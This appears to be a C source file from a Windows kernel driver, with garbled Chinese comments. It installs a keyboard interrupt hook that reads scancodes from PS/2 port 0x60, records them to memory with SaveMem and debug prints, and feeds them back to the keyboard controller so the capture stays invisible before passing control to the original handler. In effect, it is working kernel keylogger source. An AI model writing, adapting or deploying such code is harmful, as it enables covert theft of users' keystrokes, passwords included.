/*
*******************************************************************************
*= = �ļ����ƣ�MyInterruptProc.c
*= = �ļ����������̼������MyInterruptProc��ȡ�˿�����
*= = ��    �ߣ���Ĭ��С��
*= = ��дʱ�䣺2016-07-09 19:18:00
*******************************************************************************
*/

#include "MyInterruptProc.h"

//*============================================================================ 
//*= = ȫ�ֱ��� 
//*============================================================================

extern void *Origin_address;

KSPIN_LOCK SpinLock;
UCHAR KbBuff[LOG_PRE_SIZE] = { 0 };
ULONG CurPos = 0;

//*============================================================================
//*= = �������ƣ�TryKbRead
//*= = ���������������Ƿ���Զ�ȡ��������
//*= = ��ڲ�����VOID 
//*= = ���ڲ�����ULONG
//*============================================================================

ULONG TryKbRead()
{
	ULONG count = 100;
	CHAR ch;

	//������
	while (count--){
		ch = READ_PORT_UCHAR((PUCHAR)0x64);
		KeStallExecutionProcessor(50);
		//�����Ƿ��������Ϣ����ȡ
		if (!(ch & OBUFFER_FULL))
			break;
	}
	//���ؽ��
	return count ? TRUE : FALSE;
}

//*============================================================================
//*= = �������ƣ�TryKbWrite
//*= = ���������������Ƿ����д����̶˿�
//*= = ��ڲ�����VOID 
//*= = ���ڲ�����ULONG
//*============================================================================

ULONG TryKbWrite()
{
	ULONG count = 100;
	CHAR ch;

	//������
	while (count--){
		ch = READ_PORT_UCHAR((PUCHAR)0x64);
		KeStallExecutionProcessor(50);
		//�ж��Ƿ���Ҫд����Ϣ
		if (!(ch & IBUFFER_FULL))
			break;
	}
	//���ؽ��
	return count ? TRUE : FALSE;
}

//*============================================================================
//*= = �������ƣ�InKbBuff
//*= = �����������жϽػ��ַ��Ƿ񻺳�����
//*= = ��ڲ�����UCHAR 
//*= = ���ڲ�����ULONG
//*============================================================================

BOOLEAN InKbBuff(UCHAR CurCh)
{
	ULONG i = 0;
	for (i = 0; i < CurPos; i++)
		if (CurCh == KbBuff[i])
			return TRUE;

	return FALSE;
}

//*============================================================================
//*= = �������ƣ�PushKbBuff
//*= = �������������ػ����������뻺����
//*= = ��ڲ�����UCHAR 
//*= = ���ڲ�����ULONG
//*============================================================================

VOID PushKbBuff(UCHAR CurCh)
{
	ULONG i = 0;
	for (i = 0; i < CurPos; i++)
	{
		if (KbBuff[i] == 0)
		{
			KbBuff[i] = CurCh;
			return;
		}
	}

	KbBuff[CurPos++] = CurCh;
}

//*============================================================================
//*= = �������ƣ�PopKbBuff
//*= = ����������ɾ���������ж�Ӧ�ַ�
//*= = ��ڲ�����UCHAR 
//*= = ���ڲ�����VOID
//*============================================================================

VOID PopKbBuff(UCHAR CurCh)
{
	LONG i = 0;
	for (i = 0; i < CurPos; i++)
		if (CurCh == KbBuff[i]){
			KbBuff[i] = 0;
			break;
		}
	for (i = CurPos - 1; i >= 0; i--){
		if (KbBuff[i] == 0){
			--CurPos;
		}
		else
			break;
	}
}

//*============================================================================
//*= = �������ƣ�MyPortFilter
//*= = �����������˿ڹ���
//*= = ��ڲ�����VOID 
//*= = ���ڲ�����VOID
//*============================================================================

VOID MyPortFilter()
{
	UCHAR CurCh;
	KIRQL CurIrql, OldIrql;
	static BOOLEAN ExtFlag =  FALSE;

	//�жϵ�ǰ��IRQL
	CurIrql = KeGetCurrentIrql();
	CurIrql < DISPATCH_LEVEL ? 
		KeAcquireSpinLock(&SpinLock, &OldIrql) : KeAcquireSpinLockAtDpcLevel(&SpinLock);

	//�����Ƿ�ɶ� �����ȴ�
	while (!TryKbRead());

	//��ȡ
	CurCh = READ_PORT_UCHAR((PUCHAR)0x60);

	//�滻ͷβ
	if (ExtFlag && (0x2a == CurCh || 0xaa == CurCh)){
		while (!TryKbWrite());
		WRITE_PORT_UCHAR((PUCHAR)0x64, (UCHAR)0xd2);
		while (!TryKbWrite());
		WRITE_PORT_UCHAR((PUCHAR)0x60, (UCHAR)0x00);
	}
	else if (0xe0 == CurCh)								//����˫�ֽ���չ���ж�
		ExtFlag = TRUE;
	else if (!InKbBuff(CurCh)){							//�ж��Ƿ��ڻ�������(���ֽ�)	
		if (CurCh < 0x80)
			KdPrint(("[*]Makecode:%2x\n", CurCh));
		else
			KdPrint(("[*]Breakcode:%2x\n", CurCh));

		if (ExtFlag){
			ExtFlag = FALSE;
			KdPrint(("[*]ExtRecord:%2x\n", CurCh));
			SaveMem(CurCh);
		}else{
			PushKbBuff(CurCh);							//�洢��ǰ�ַ�
			while (!TryKbWrite());						//������

			//д������
			WRITE_PORT_UCHAR((PUCHAR)0x64, (UCHAR)0xd2);

			while (!TryKbWrite());						//������

			WRITE_PORT_UCHAR((PUCHAR)0x60, (UCHAR)CurCh);

			//д���ڴ�
			SaveMem(CurCh);
		}
	}else{
		PopKbBuff(CurCh);								//��������
	}

	//�жϵ�ǰ��IRQL
	CurIrql < DISPATCH_LEVEL ?
		KeReleaseSpinLock(&SpinLock, OldIrql) : KeReleaseSpinLockFromDpcLevel(&SpinLock);
}

//*============================================================================
//*= = �������ƣ�MyInterruptProc
//*= = �����������㺯���������C�����ܹ�
//*= = ��ڲ�����VOID 
//*= = ���ڲ�����VOID
//*============================================================================

__declspec(naked) VOID MyInterruptProc()
{
	__asm
	{
		pushad								// �������е�ͨ�üĴ���
		pushfd								// �����־�Ĵ���
		push fs
		mov bx, 0x30
		mov fs, bx							//fs�μĴ������ں�ֵ̬�̶�Ϊ0x30
		push ds
		push es
	}

	MyPortFilter();							// ����DIY������

	__asm
	{
		pop es
		pop ds
		pop fs
		popfd								// �ָ���־�Ĵ���
		popad								// �ָ�ͨ�üĴ���
		jmp Origin_address					// ����ԭ�����жϷ������
	}
}

//*============================================================================
//*= = �ļ����� 
//*============================================================================